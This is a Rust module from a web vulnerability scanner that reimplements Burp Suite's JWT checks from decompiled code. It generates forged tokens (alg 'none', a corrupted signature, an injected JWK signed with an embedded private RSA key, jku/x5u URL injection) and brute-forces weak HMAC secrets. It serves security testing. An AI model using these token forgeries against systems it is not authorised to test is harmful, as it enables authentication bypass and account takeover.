//! JSON Web Tokens for the JWT scanner checks (R-09): recognition, the
//! attack variants Burp's active JWT check sends, HMAC verification for
//! "JWT weak HMAC secret", and where tokens are found in a request.
//!
//! Burp evidence (decompiled build 52685, readable_strict):
//! - recognition `Zs_w.ZT`: starts with "e", at least 23 characters, then a
//!   JWS parse (bytecode at Zs_w.java:9-52);
//! - token sources `Zb2r.Zk`: every request header (an "Authorization:
//!   Bearer " prefix stripped, else the text after the first ':') and every
//!   request parameter value (Zb2r.java:16-53);
//! - attack variants `Zi8s.ZM`: case 1 the signature replaced by as many
//!   "A" characters (Zi8s.java:18-22); case 2 alg set to each of "nonE",
//!   "None", "none" with an empty signature (Zi8s.java:23-24, 41-45; the
//!   three literals from strings/map_merged.tsv); case 3 alg RS256, an
//!   attacker RSA key in "jwk", "kid" set when empty, signed with that key
//!   (Zi8s.java:25-34). WebProbe signs with its own generated test key, not
//!   Burp's embedded one;
//! - the control token `Zu4y`: the payload replaced by "{", spaces, "}" of
//!   the same length (Zu4y.java:57);
//! - weak secret `Zbpi`: HMAC-SHA256/384/512 of the signing input with each
//!   candidate, compared with the signature; an empty candidate is the key
//!   [0] (Zbpi.java:27-141).

use base64::Engine;

const B64: base64::engine::GeneralPurpose = base64::engine::general_purpose::URL_SAFE_NO_PAD;

/// A JWS in compact form, split and decoded.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Jwt {
    pub raw: String,
    pub header: serde_json::Map<String, serde_json::Value>,
    pub header_b64: String,
    pub payload_b64: String,
    pub signature_b64: String,
}

fn b64d(s: &str) -> Option<Vec<u8>> {
    B64.decode(s.trim_end_matches('=')).ok()
}

impl Jwt {
    /// Burp's recognition: "e"…, at least 23 characters, three base64url
    /// parts whose header is a JSON object.
    pub fn parse(s: &str) -> Option<Jwt> {
        let s = s.trim();
        if !s.starts_with('e') || s.len() < 23 {
            return None;
        }
        let mut parts = s.split('.');
        let (h, p, sig) = (parts.next()?, parts.next()?, parts.next()?);
        if parts.next().is_some() || h.is_empty() {
            return None;
        }
        b64d(p)?;
        b64d(sig)?;
        let header = match serde_json::from_slice::<serde_json::Value>(&b64d(h)?).ok()? {
            serde_json::Value::Object(m) => m,
            _ => return None,
        };
        Some(Jwt {
            raw: s.to_string(),
            header,
            header_b64: h.into(),
            payload_b64: p.into(),
            signature_b64: sig.into(),
        })
    }

    pub fn alg(&self) -> String {
        self.header
            .get("alg")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string()
    }

    pub fn signing_input(&self) -> String {
        format!("{}.{}", self.header_b64, self.payload_b64)
    }

    pub fn payload(&self) -> Vec<u8> {
        b64d(&self.payload_b64).unwrap_or_default()
    }

    pub fn signature(&self) -> Vec<u8> {
        b64d(&self.signature_b64).unwrap_or_default()
    }

    fn with_header(
        &self,
        header: &serde_json::Map<String, serde_json::Value>,
        payload_b64: &str,
        signature_b64: &str,
    ) -> String {
        let h = B64.encode(serde_json::to_vec(header).unwrap_or_default());
        format!("{h}.{payload_b64}.{signature_b64}")
    }

    /// The JWK in the header holds private key material (RSA/EC/OKP "d",
    /// or a symmetric "k").
    pub fn jwk_has_private_key(&self) -> bool {
        self.header
            .get("jwk")
            .and_then(|j| j.as_object())
            .is_some_and(|j| j.contains_key("d") || j.contains_key("k"))
    }
}

/// Case 1: the signature replaced by as many "A" characters.
pub fn corrupt_signature(t: &Jwt) -> String {
    format!(
        "{}.{}.{}",
        t.header_b64,
        t.payload_b64,
        "A".repeat(t.signature_b64.len())
    )
}

/// Case 2: alg "nonE", "None", "none", each with an empty signature.
pub fn none_variants(t: &Jwt) -> Vec<String> {
    ["nonE", "None", "none"]
        .iter()
        .map(|alg| {
            let mut h = t.header.clone();
            h.insert("alg".into(), (*alg).into());
            t.with_header(&h, &t.payload_b64, "")
        })
        .collect()
}

/// WebProbe's own RSA test key (generated for WebProbe, PKCS#1, base64).
const JWK_KEY_DER_B64: &str = "MIIEpAIBAAKCAQEAyd89wvkrSRWpxKfx+PukXCG45HA2ov+tjxdw4k+ma7yau3FxAEIEc1Dj0+yzuoaiBRpqpIin/qGSQayXUpKIJe4CM+cKkxDPH+WwL7F+MMAQejCKrtfnAp2gKZmrH9dOdnbE9Tg19ibkG7BDrN0hmYmw7Tzq2yBq45iVWXMjUFhT9qEmsiwzAhttVL+IlFu7ur2kcdChv5q8qw2FOq8tJJmeotAphCtCJV6TKHz/SIJPoE/YS1tLn8MQeO1XTRnarUw4JOa6MrmlSyzDVww6dB1HQXVfTnlCTZrOOBIoMD0T0hlaWuckIE719mEOxG8sWFjMmyORPttKk7ngvuYBsQIDAQABAoIBAA0qIkXJ6FaP85jFV68kK0VDgQ0LUPzTOKHJZmKpIry0OXuk0Q4yapuMjbb0djS2nUVA7O3Fkv200qwMEc2K4cG7d5L5QQQd3KwDV2MyK30JYWmz1a9uQ/yJ2U0tM27UTyPEPgw8egRkkovzCY7HLZmXfvK8U20ufC9THtY3qc4OPtWDT/WHtN/CHRazs/GagpqBsNy67t3DldQ99E5ot69gf2foHBToEntbc38dJN5NVYugwCpE8Et5uf4cHeNHaPCLV/SbGCTb0vCEb5B9R3eoVR0e5XgsFCLVdVba5VGNXh5FwVFHHZh2HNzWhhIXAOlZkfDJagTqLn42qHbFcisCgYEA8wOcwAC1tYWF9qBzQyyKi1w/59ms29C6WPdo1eqYyQ4I59pyVy++/0Ue7D4wBhdwd7mZ+2qUwYi6+2rdz9XEuoZ/eHe1cSgQ1Qq2JOjz31WF6pqML+sl7p8yyXV1z4XzLjmZRJ/ZEfYYxKzPlZk0o7h7cjeb7/ffGmNbSJtxOMsCgYEA1KjQI/6krahpNQuvBDoET4aYnAOFiwzZXZzBNsiS2zPQsIdnmIu9oZnhf7onMqsaQiUgtzrl33jBkpV6BTss+tthJkRqX9srzjmIUHIO0IatrZvb3LFZ/0c+crJdKXzQWc1W1Cs4d6PLgySRNZDLKSI3gRUXHFIk8f/r/HRJK/MCgYEApDulvPD93M5/Sb0ICLbabvKKUeN/ehMnTSbvl9pzJTWx+RddvOSMvTH2gwxIImXG4XLyyMIwBFemnnGLtIEw8iohjcXBPtcoAQK7NFinMCE5XuLRqTTPLuQyS4pxcy2AupW8qm8pIYVjGc/8forK03bDHt7MKTIoekn5kClVLF8CgYAzdQ24R/utEZ0zerpEuY0leRogVjHQLbHDFxUhnnL6m5UZwgntPZMLMWMBNxgZCJH4A2fhLl1FL8EXKRg3f9Qod0EQs2lR/ISjCATWAmNXTd9krNwMkNWIEcMomcQ1L8Byml8yQ6sMOBQcjZKddYXTVDY+A85tyeqqrBR8J980xQKBgQCqkwpWy6duR1VqlgpN099thO7ubAsVr5uhv/qFdHnjeppGkYLs9eLjeY4PfjRFY9aXq42R+tVQxDr61J3r96i3yF5OSg4fmm+RlCGfw4qC+U5YaDqrkCHtGiQcIYwUB+lKuhcO1blvRhwedfaomZXrgurm/EXwvmIm/3rqw0x2ig==";
const JWK_N: &str = "yd89wvkrSRWpxKfx-PukXCG45HA2ov-tjxdw4k-ma7yau3FxAEIEc1Dj0-yzuoaiBRpqpIin_qGSQayXUpKIJe4CM-cKkxDPH-WwL7F-MMAQejCKrtfnAp2gKZmrH9dOdnbE9Tg19ibkG7BDrN0hmYmw7Tzq2yBq45iVWXMjUFhT9qEmsiwzAhttVL-IlFu7ur2kcdChv5q8qw2FOq8tJJmeotAphCtCJV6TKHz_SIJPoE_YS1tLn8MQeO1XTRnarUw4JOa6MrmlSyzDVww6dB1HQXVfTnlCTZrOOBIoMD0T0hlaWuckIE719mEOxG8sWFjMmyORPttKk7ngvuYBsQ";
pub const JWK_KID: &str = "webprobe-jwk-3f2c";

/// Case 3: alg RS256, the attacker's public key in "jwk", "kid" set when
/// the token had none, signed with the matching private key.
pub fn jwk_variant(t: &Jwt) -> Option<String> {
    let mut h = t.header.clone();
    h.insert("alg".into(), "RS256".into());
    h.insert(
        "jwk".into(),
        serde_json::json!({"kty": "RSA", "kid": JWK_KID, "e": "AQAB", "n": JWK_N}),
    );
    if h.get("kid")
        .and_then(|k| k.as_str())
        .is_none_or(str::is_empty)
    {
        h.insert("kid".into(), JWK_KID.into());
    }
    let hb = B64.encode(serde_json::to_vec(&h).ok()?);
    let input = format!("{hb}.{}", t.payload_b64);
    let der = base64::engine::general_purpose::STANDARD
        .decode(JWK_KEY_DER_B64)
        .ok()?;
    let key = ring::signature::RsaKeyPair::from_der(&der).ok()?;
    let mut sig = vec![0u8; key.public().modulus_len()];
    key.sign(
        &ring::signature::RSA_PKCS1_SHA256,
        &ring::rand::SystemRandom::new(),
        input.as_bytes(),
        &mut sig,
    )
    .ok()?;
    Some(format!("{input}.{}", B64.encode(sig)))
}

/// The header `name` ("jku" / "x5u") set to `url`; payload and signature kept.
pub fn header_url_variant(t: &Jwt, name: &str, url: &str) -> String {
    let mut h = t.header.clone();
    h.insert(name.into(), url.into());
    t.with_header(&h, &t.payload_b64, &t.signature_b64)
}

/// Zu4y's control token: the payload JSON replaced by "{", spaces, "}" of
/// the same length, signature unchanged (so it must not verify).
pub fn control_token(t: &Jwt) -> String {
    let len = t.payload().len().max(2);
    let p = format!("{{{}}}", " ".repeat(len - 2));
    format!("{}.{}.{}", t.header_b64, B64.encode(p), t.signature_b64)
}

fn hmac<D: sha2::Digest + sha2::digest::core_api::BlockSizeUser>(
    key: &[u8],
    data: &[u8],
) -> Vec<u8> {
    let block = <D as sha2::digest::core_api::BlockSizeUser>::block_size();
    let mut k = if key.len() > block {
        D::digest(key).to_vec()
    } else {
        key.to_vec()
    };
    k.resize(block, 0);
    let mut inner = D::new();
    inner.update(k.iter().map(|b| b ^ 0x36).collect::<Vec<u8>>());
    inner.update(data);
    let ih = inner.finalize();
    let mut outer = D::new();
    outer.update(k.iter().map(|b| b ^ 0x5c).collect::<Vec<u8>>());
    outer.update(ih);
    outer.finalize().to_vec()
}

/// HMAC of `data` for a JWS "HS256" / "HS384" / "HS512"; None otherwise.
pub fn hmac_for(alg: &str, key: &[u8], data: &[u8]) -> Option<Vec<u8>> {
    match alg {
        "HS256" => Some(hmac::<sha2::Sha256>(key, data)),
        "HS384" => Some(hmac::<sha2::Sha384>(key, data)),
        "HS512" => Some(hmac::<sha2::Sha512>(key, data)),
        _ => None,
    }
}

/// The candidate that signed an HMAC token, if any (Burp's Zbpi; the empty
/// candidate means the one-byte key [0]).
pub fn weak_secret<'a>(t: &Jwt, candidates: impl IntoIterator<Item = &'a str>) -> Option<String> {
    let alg = t.alg();
    if !matches!(alg.as_str(), "HS256" | "HS384" | "HS512") {
        return None;
    }
    let sig = t.signature();
    let input = t.signing_input();
    candidates
        .into_iter()
        .find(|c| {
            let key: &[u8] = if c.is_empty() { &[0] } else { c.as_bytes() };
            hmac_for(&alg, key, input.as_bytes()).is_some_and(|m| m == sig)
        })
        .map(str::to_string)
}

/// Burp's token sources (Zb2r): each request header value (after an
/// "Authorization: Bearer " prefix or the first ':') and each request
/// parameter value (query, form body, cookies), as tokens.
pub fn tokens_in_request(req: &crate::util::HttpParts, raw: &[u8]) -> Vec<Jwt> {
    let mut found: Vec<Jwt> = Vec::new();
    let mut add = |v: &str| {
        if let Some(t) = Jwt::parse(&crate::util::url_decode(v)) {
            if !found.iter().any(|f| f.raw == t.raw) {
                found.push(t);
            }
        }
    };
    for (k, v) in &req.headers {
        let v = if k.eq_ignore_ascii_case("authorization") {
            v.trim().strip_prefix("Bearer ").unwrap_or(v)
        } else {
            v
        };
        add(v);
        if k.eq_ignore_ascii_case("cookie") {
            for c in v.split(';') {
                add(c.split_once('=').map_or(c, |(_, val)| val));
            }
        }
    }
    let query = req.path.split_once('?').map(|(_, q)| q).unwrap_or("");
    let body = String::from_utf8_lossy(&raw[req.head_len.min(raw.len())..]).into_owned();
    for pair in query.split('&').chain(body.split('&')) {
        if let Some((_, v)) = pair.split_once('=') {
            add(v);
        }
    }
    found
}

/// Burp's secret list (the user's install, `paths::jwt_secrets`), read once.
pub fn secrets() -> &'static [String] {
    static LIST: std::sync::OnceLock<Vec<String>> = std::sync::OnceLock::new();
    LIST.get_or_init(|| {
        crate::paths::jwt_secrets()
            .ok()
            .and_then(|p| {
                crate::util::read_text_file_capped(&p, crate::util::MAX_TEXT_FILE_BYTES).ok()
            })
            .map(|t| t.lines().map(str::to_string).collect())
            .unwrap_or_default()
    })
}
